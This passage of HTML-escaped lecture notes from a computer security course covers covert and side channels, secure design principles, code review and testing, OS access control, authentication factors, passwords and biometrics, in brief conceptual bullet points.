&lt;li&gt;What information can/cannot be transmitted through a channel may be determined by a policy/guidelines/physical limitation&lt;/li&gt;
&lt;li&gt;An attacker sees that the victim, although not using internet, publishes a report summarizing public information&lt;/li&gt;
&lt;li&gt;The attacker can hide the data in the report&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cache-timing-side-channels&#34; &gt;Cache Timing side channels
&lt;span&gt;
    &lt;a href=&#34;#cache-timing-side-channels&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Spectre and Meltdown attacks&lt;/li&gt;
&lt;li&gt;Caches are shared: by timing cache access, a process can learn information about data used by another.&lt;/li&gt;
&lt;li&gt;Speculative and out of order execution can be exploited&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;other-potential-attack-vectors&#34; &gt;Other Potential Attack Vectors
&lt;span&gt;
    &lt;a href=&#34;#other-potential-attack-vectors&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Bandwidth consumption&lt;/li&gt;
&lt;li&gt;Timing computations&lt;/li&gt;
&lt;li&gt;Electromagnetic emission&lt;/li&gt;
&lt;li&gt;Sound emissions&lt;/li&gt;
&lt;li&gt;Power consumption&lt;/li&gt;
&lt;li&gt;Differential power analysis&lt;/li&gt;
&lt;li&gt;Differential fault analysis&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;controls-against-security-flaws&#34; &gt;Controls Against Security Flaws
&lt;span&gt;
    &lt;a href=&#34;#controls-against-security-flaws&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Several stages in software life cycle&lt;/li&gt;
&lt;li&gt;Design&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;design---modularity&#34; &gt;Design - Modularity
&lt;span&gt;
    &lt;a href=&#34;#design---modularity&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;each responsible for a single subtask&lt;/li&gt;
&lt;li&gt;easier to check for flaws&lt;/li&gt;
&lt;li&gt;low coupling&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;design---encapsulation&#34; &gt;Design - Encapsulation
&lt;span&gt;
    &lt;a href=&#34;#design---encapsulation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;self-contained&lt;/li&gt;
&lt;li&gt;reduce coupling&lt;/li&gt;
&lt;li&gt;do not need to know implementation of other modules (use APIs)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;design---information-hiding&#34; &gt;Design - Information Hiding
&lt;span&gt;
    &lt;a href=&#34;#design---information-hiding&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Implementation and internal state should be hidden from developers of other module&lt;/li&gt;
&lt;li&gt;Prevents reliance on behaviour not promised in the API&lt;/li&gt;
&lt;li&gt;also hides malicious actions
&lt;ul&gt;
&lt;li&gt;Samsung.pck&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;design---mutual-suspicion&#34; &gt;Design - Mutual Suspicion
&lt;span&gt;
    &lt;a href=&#34;#design---mutual-suspicion&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Input validation / sanitation&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;design---confinement&#34; &gt;Design - Confinement
&lt;span&gt;
    &lt;a href=&#34;#design---confinement&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Sandbox functionality of other modules that are required&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;security-controls-implementation&#34; &gt;Security Controls Implementation
&lt;span&gt;
    &lt;a href=&#34;#security-controls-implementation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;don&amp;rsquo;t use C&lt;/li&gt;
&lt;li&gt;static code analysis
&lt;ul&gt;
&lt;li&gt;software products that look for buffer overflows, TOCTTOU&lt;/li&gt;
&lt;li&gt;do not rely on them&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;hardware assistance
&lt;ul&gt;
&lt;li&gt;ARM Pointer Authentication &lt;a href=&#34;https://lwn.net/Articles/718888/&#34;&gt;https://lwn.net/Articles/718888/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Hardware-assisted shadow stack &lt;a href=&#34;https://lwn.net/Articles/758245/&#34;&gt;https://lwn.net/Articles/758245/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Capabilities in hardware &lt;a href=&#34;https://www.cl.cam.ac.uk/research/security/ctsrd/cheri/&#34;&gt;https://www.cl.cam.ac.uk/research/security/ctsrd/cheri/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;formal methods
&lt;ul&gt;
&lt;li&gt;try proving that the code is correct&lt;/li&gt;
&lt;li&gt;not really possible&lt;/li&gt;
&lt;li&gt;need markups or assertions&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;genetic diversity
&lt;ul&gt;
&lt;li&gt;lots of machines run the same code, but if there was more different implementations, less common flaw&lt;/li&gt;
&lt;li&gt;same thing happens in agriculture&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;security-controls---code-reviews&#34; &gt;Security Controls - Code Reviews
&lt;span&gt;
    &lt;a href=&#34;#security-controls---code-reviews&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;LGTM!&lt;/li&gt;
&lt;li&gt;Just get the code&lt;/li&gt;
&lt;li&gt;Better: guided walk-through
&lt;ul&gt;
&lt;li&gt;explain code to reviewers (comments suffice imo)&lt;/li&gt;
&lt;li&gt;good for changes to code&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Easter egg code reviews are when no problems are assumed
&lt;ul&gt;
&lt;li&gt;Therefore, author can intentionally insert flaws so reviewer reviews better&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;security-controls---testing&#34; &gt;Security Controls - Testing
&lt;span&gt;
    &lt;a href=&#34;#security-controls---testing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;black-box&lt;/li&gt;
&lt;li&gt;fuzz testing
&lt;ul&gt;
&lt;li&gt;random data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;white-box
&lt;ul&gt;
&lt;li&gt;useful for regression testing&lt;/li&gt;
&lt;li&gt;suite of tests created&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;security-controls---docs&#34; &gt;Security Controls - Docs
&lt;span&gt;
    &lt;a href=&#34;#security-controls---docs&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;write down choices made and why they were made&lt;/li&gt;
&lt;li&gt;if there is a question to do a secure thing, it should be done and ask if it should be removed rather than not enforced at all or earmarked for later&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;standards-processes-audit&#34; &gt;Standards, Processes, Audit
&lt;span&gt;
    &lt;a href=&#34;#standards-processes-audit&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;standards: what to use (design, testing, etc)&lt;/li&gt;
&lt;li&gt;processes: how to implement standards&lt;/li&gt;
&lt;li&gt;audits: verification that implementation was done correctly&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;operating-systems&#34; &gt;Operating Systems
&lt;span&gt;
    &lt;a href=&#34;#operating-systems&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;allows different entities to access different resources in a shared way
&lt;ul&gt;
&lt;li&gt;files, memory, etc.&lt;/li&gt;
&lt;li&gt;(subjects vs. objects)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;separation-in-os&#34; &gt;Separation in OS
&lt;span&gt;
    &lt;a href=&#34;#separation-in-os&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Keep user&amp;rsquo;s objects separate from other users&lt;/li&gt;
&lt;li&gt;Physical&lt;/li&gt;
&lt;li&gt;Temporal&lt;/li&gt;
&lt;li&gt;Logical&lt;/li&gt;
&lt;li&gt;Cryptographic&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;access-control-lists-acls&#34; &gt;Access control lists (ACLs)
&lt;span&gt;
    &lt;a href=&#34;#access-control-lists-acls&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Each object has a list of subjects and their access rights&lt;/li&gt;
&lt;li&gt;Determine set of allowed users per objects&lt;/li&gt;
&lt;li&gt;Determine set of objects that a user can access&lt;/li&gt;
&lt;li&gt;Revoke a user&amp;rsquo;s access right to an object or all objects&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;acls-and-capabilities&#34; &gt;ACLs and capabilities
&lt;span&gt;
    &lt;a href=&#34;#acls-and-capabilities&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;UNIX each file has an ACL and the caller is given a list of capabilities as well&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mason.gmu.edu/~montecin/UNIXpermiss.htm&#34;&gt;UNIX Permissions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;authentication-factors&#34; &gt;Authentication Factors
&lt;span&gt;
    &lt;a href=&#34;#authentication-factors&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Something the user knows&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Password, PIN&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Something the user has&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Badge&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Something the user is&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Biometrics&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;User Context&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Location, time, devices in proximity&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;There&amp;rsquo;s also &lt;a href=&#34;https://github.com/johwconst/keystrokeDynamics2FA&#34;&gt;https://github.com/johwconst/keystrokeDynamics2FA&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;passwords&#34; &gt;Passwords
&lt;span&gt;
    &lt;a href=&#34;#passwords&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;8 in length can be cracked easily&lt;/li&gt;
&lt;li&gt;Probably want a password at least 10 in length
&lt;ul&gt;
&lt;li&gt;Don&amp;rsquo;t use acronyms, use full form&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Password hygiene
&lt;ul&gt;
&lt;li&gt;Use a password manager to create and store password&lt;/li&gt;
&lt;li&gt;Autofill option&lt;/li&gt;
&lt;li&gt;Problem?&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NIST Advice for Develoeprs
&lt;ul&gt;
&lt;li&gt;Allow copying&lt;/li&gt;
&lt;li&gt;Do not prompt password changes as it leads to cycling&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cryptographic-tools&#34; &gt;Cryptographic Tools
&lt;span&gt;
    &lt;a href=&#34;#cryptographic-tools&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Hash: Fixed length deterministic output from a variable-length input value&lt;/li&gt;
&lt;li&gt;Mac: one-way, computers a password fingerprint&lt;/li&gt;
&lt;li&gt;Encryption: with a secret key you can recover data&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;adobe-password-hacks&#34; &gt;Adobe Password Hacks
&lt;span&gt;
    &lt;a href=&#34;#adobe-password-hacks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Each password has a hint (123456)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;biometrics&#34; &gt;Biometrics
&lt;span&gt;
    &lt;a href=&#34;#biometrics&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;physical characteristics&lt;/li&gt;
&lt;li&gt;sufficiently close&lt;/li&gt;
&lt;li&gt;observed fingerprint will never be identical to previously stored fingerprint of the same user&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;trusted-system-design-elements&#34; &gt;Trusted System Design Elements
&lt;span&gt;
    &lt;a href=&#34;#trusted-system-design-elements&#34;&gt;
